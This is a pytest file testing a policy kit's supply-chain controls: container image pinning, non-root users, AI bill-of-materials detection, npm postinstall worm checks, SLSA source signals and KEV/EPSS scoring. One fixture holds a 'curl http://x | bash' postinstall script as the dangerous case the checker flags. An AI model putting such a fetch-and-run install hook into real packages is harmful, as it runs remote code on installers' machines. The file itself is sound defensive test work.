"""Branch coverage for ``evaluators/supply_chain.py`` (containers, AIBOM, WORM, SLSA, SCA)."""

from __future__ import annotations

import json
from pathlib import Path

from oss_policy_kit.application.evaluators import supply_chain as sc
from oss_policy_kit.domain.models import ControlStatus
from oss_policy_kit.infrastructure.aws_ci_parser import AwsCiAnalysis
from oss_policy_kit.infrastructure.azure_pipeline_parser import AzurePipelineAnalysis
from oss_policy_kit.infrastructure.workflow_parser import WorkflowAnalysis

_OSV_REL = ".oss-policy-kit/evidence/sast/osv-scanner.sarif.json"


def _ctx(tmp_path: Path, *, workflow_paths: list[Path] | None = None) -> sc.EvalContext:
    return sc.EvalContext(
        repo_root=tmp_path,
        profile_id="github-level-2",
        workflows=WorkflowAnalysis(workflow_paths=workflow_paths or []),
        azure_pipelines=AzurePipelineAnalysis(),
        aws_ci=AwsCiAnalysis(),
        scorecard=None,
    )


def _write(tmp_path: Path, rel: str, text: str) -> Path:
    p = tmp_path / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")
    return p


# --------------------------------------------------------------------------- #
# CONT-IMAGE-001/002/003
# --------------------------------------------------------------------------- #


def test_cont_image_001_pass_and_fail(tmp_path: Path) -> None:
    _write(tmp_path, "Dockerfile", "FROM ubuntu:22.04@sha256:" + "a" * 64 + "\n")
    assert sc.eval_cont_image_001(_ctx(tmp_path)).status == ControlStatus.PASS
    _write(tmp_path, "Dockerfile", "FROM ubuntu:22.04\n")
    assert sc.eval_cont_image_001(_ctx(tmp_path)).status == ControlStatus.FAIL


def test_cont_image_001_na(tmp_path: Path) -> None:
    assert sc.eval_cont_image_001(_ctx(tmp_path)).status == ControlStatus.NOT_APPLICABLE


def test_cont_image_002_root_missing_pass(tmp_path: Path) -> None:
    _write(tmp_path, "Dockerfile", "FROM ubuntu\nUSER root\n")
    assert sc.eval_cont_image_002(_ctx(tmp_path)).status == ControlStatus.FAIL
    _write(tmp_path, "Dockerfile", "FROM ubuntu\nRUN echo hi\n")
    assert sc.eval_cont_image_002(_ctx(tmp_path)).status == ControlStatus.FAIL  # no USER
    _write(tmp_path, "Dockerfile", "FROM ubuntu\nUSER appuser\n")
    assert sc.eval_cont_image_002(_ctx(tmp_path)).status == ControlStatus.PASS


def test_cont_image_003_pass_and_fail(tmp_path: Path) -> None:
    _write(tmp_path, "Dockerfile", "FROM ubuntu\nUSER appuser\n")
    wf = _write(tmp_path, ".github/workflows/scan.yml", "steps:\n  - uses: aquasecurity/trivy-action@v0\n")
    assert sc.eval_cont_image_003(_ctx(tmp_path, workflow_paths=[wf])).status == ControlStatus.PASS
    assert sc.eval_cont_image_003(_ctx(tmp_path)).status == ControlStatus.FAIL  # no scan signal


# --------------------------------------------------------------------------- #
# AIBOM
# --------------------------------------------------------------------------- #


def test_aibom_present_via_evidence_dir(tmp_path: Path) -> None:
    _write(tmp_path, ".oss-policy-kit/evidence/aibom/model.json", "{}")
    assert sc.eval_aibom_present_001(_ctx(tmp_path)).status == ControlStatus.PASS


def test_aibom_present_via_ml_marker(tmp_path: Path) -> None:
    _write(tmp_path, "bom.json", json.dumps({"components": [{"type": "machine-learning-model"}]}))
    assert sc.eval_aibom_present_001(_ctx(tmp_path)).status == ControlStatus.PASS


def test_aibom_absent(tmp_path: Path) -> None:
    assert sc.eval_aibom_present_001(_ctx(tmp_path)).status == ControlStatus.MANUAL_REVIEW_REQUIRED


def test_is_ml_bom_marker_file(tmp_path: Path) -> None:
    p = _write(tmp_path, "x.cdx.json", '{"x": "modelCard"}')
    assert sc._is_ml_bom_marker_file(p, tmp_path)
    p2 = _write(tmp_path, "y.json", "{}")
    assert not sc._is_ml_bom_marker_file(p2, tmp_path)


# --------------------------------------------------------------------------- #
# WORM postinstall
# --------------------------------------------------------------------------- #


def test_worm_postinstall_clean_and_danger(tmp_path: Path) -> None:
    _write(tmp_path, "package.json", json.dumps({"scripts": {"postinstall": "node build.js"}}))
    assert sc.eval_worm_postinstall_001(_ctx(tmp_path)).status == ControlStatus.PASS
    _write(tmp_path, "package.json", json.dumps({"scripts": {"postinstall": "curl http://x | bash"}}))
    assert sc.eval_worm_postinstall_001(_ctx(tmp_path)).status == ControlStatus.FAIL


def test_worm_postinstall_unparseable(tmp_path: Path) -> None:
    _write(tmp_path, "package.json", "{not json")
    assert sc.eval_worm_postinstall_001(_ctx(tmp_path)).status == ControlStatus.MANUAL_REVIEW_REQUIRED


# --------------------------------------------------------------------------- #
# SLSA source
# --------------------------------------------------------------------------- #


def test_slsa_src_001_git_present(tmp_path: Path) -> None:
    (tmp_path / ".git").mkdir()
    assert sc.eval_slsa_src_001(_ctx(tmp_path)).status == ControlStatus.PASS
    other = tmp_path / "nogit"
    other.mkdir()
    assert sc.eval_slsa_src_001(_ctx(other)).status == ControlStatus.FAIL


def test_slsa_src_002_signature_signal_in_ruleset_dir(tmp_path: Path) -> None:
    _write(tmp_path, ".github/rulesets/main.json", json.dumps({"required_signatures": True}))
    assert sc.eval_slsa_src_002(_ctx(tmp_path)).status == ControlStatus.PASS
    assert sc.eval_slsa_src_002(_ctx(tmp_path / "empty")).status == ControlStatus.MANUAL_REVIEW_REQUIRED


def _branch_protection(**protections: bool) -> str:
    """Evidence in the shape the packaged schema accepts -- flags nested, not at the root.

    All five required flags are emitted, off unless a test names them; `protections` is closed
    and lists them as required, so a block carrying only the flag under test is rejected before
    any control reads it.
    """

    return json.dumps(
        {
            "schema_version": "branch-protection/v1",
            "attested_at": "2026-06-15",
            "attested_by": "platform-team",
            "branch": "main",
            "protections": {
                "require_pull_request_reviews": False,
                "dismiss_stale_reviews": False,
                "require_status_checks": False,
                "enforce_admins": False,
                "restrict_force_push": False,
                **protections,
            },
        }
    )


def test_slsa_src_003_pass(tmp_path: Path) -> None:
    _write(tmp_path, ".oss-policy-kit/evidence/branch-protection.json", _branch_protection(require_status_checks=True))
    assert sc.eval_slsa_src_003(_ctx(tmp_path)).status == ControlStatus.PASS


def test_slsa_src_004_pass(tmp_path: Path) -> None:
    _write(
        tmp_path,
        ".oss-policy-kit/evidence/branch-protection.json",
        _branch_protection(require_pull_request_reviews=True),
    )
    assert sc.eval_slsa_src_004(_ctx(tmp_path)).status == ControlStatus.PASS


# --------------------------------------------------------------------------- #
# SCA KEV / EPSS
# --------------------------------------------------------------------------- #


def _osv(tmp_path: Path, results: list[dict]) -> None:
    _write(tmp_path, _OSV_REL, json.dumps({"runs": [{"results": results}]}))


def test_sca_kev_pass_and_fail(tmp_path: Path) -> None:
    # `"properties": {}` used to PASS here. It carries no `kev` field, so the scan cannot
    # tell "enrichment ran, nothing flagged" from "no enrichment present" -- and PASS
    # asserts the first. It is manual review now; PASS needs `kev` to be there and false.
    _osv(tmp_path, [{"ruleId": "CVE-OK", "properties": {}}])
    assert sc.eval_sca_kev_001(_ctx(tmp_path)).status == ControlStatus.MANUAL_REVIEW_REQUIRED
    _osv(tmp_path, [{"ruleId": "CVE-OK", "properties": {"kev": False}}])
    assert sc.eval_sca_kev_001(_ctx(tmp_path)).status == ControlStatus.PASS
    _osv(tmp_path, [{"ruleId": "CVE-KEV", "properties": {"kev": True}}])
    assert sc.eval_sca_kev_001(_ctx(tmp_path)).status == ControlStatus.FAIL


def test_sca_kev_missing_and_bad(tmp_path: Path) -> None:
    assert sc.eval_sca_kev_001(_ctx(tmp_path)).status == ControlStatus.MANUAL_REVIEW_REQUIRED
    _write(tmp_path, _OSV_REL, "{not json")
    assert sc.eval_sca_kev_001(_ctx(tmp_path)).status == ControlStatus.MANUAL_REVIEW_REQUIRED


def test_sca_epss_pass_fail_bad(tmp_path: Path) -> None:
    _osv(tmp_path, [{"ruleId": "CVE-LOW", "properties": {"epss_score": 0.1}}])
    assert sc.eval_sca_epss_001(_ctx(tmp_path)).status == ControlStatus.PASS
    _osv(tmp_path, [{"ruleId": "CVE-HI", "properties": {"epss_score": 0.9, "cvss_score": 8.0}}])
    assert sc.eval_sca_epss_001(_ctx(tmp_path)).status == ControlStatus.FAIL
    _write(tmp_path, _OSV_REL, "{not json")
    assert sc.eval_sca_epss_001(_ctx(tmp_path)).status == ControlStatus.MANUAL_REVIEW_REQUIRED


# --------------------------------------------------------------------------- #
# Distroless
# --------------------------------------------------------------------------- #


def test_distroless_pass_and_review(tmp_path: Path) -> None:
    _write(tmp_path, "Dockerfile", "FROM gcr.io/distroless/static\n")
    assert sc.eval_cont_distroless_001(_ctx(tmp_path)).status == ControlStatus.PASS
    _write(tmp_path, "Dockerfile", "FROM ubuntu:22.04\n")
    assert sc.eval_cont_distroless_001(_ctx(tmp_path)).status == ControlStatus.MANUAL_REVIEW_REQUIRED


def test_distroless_na(tmp_path: Path) -> None:
    assert sc.eval_cont_distroless_001(_ctx(tmp_path)).status == ControlStatus.NOT_APPLICABLE


def test_discover_dockerfiles_nested(tmp_path: Path) -> None:
    _write(tmp_path, "svc/Dockerfile", "FROM alpine\n")
    found = sc._discover_dockerfiles(tmp_path)
    assert any(p.name == "Dockerfile" for p in found)
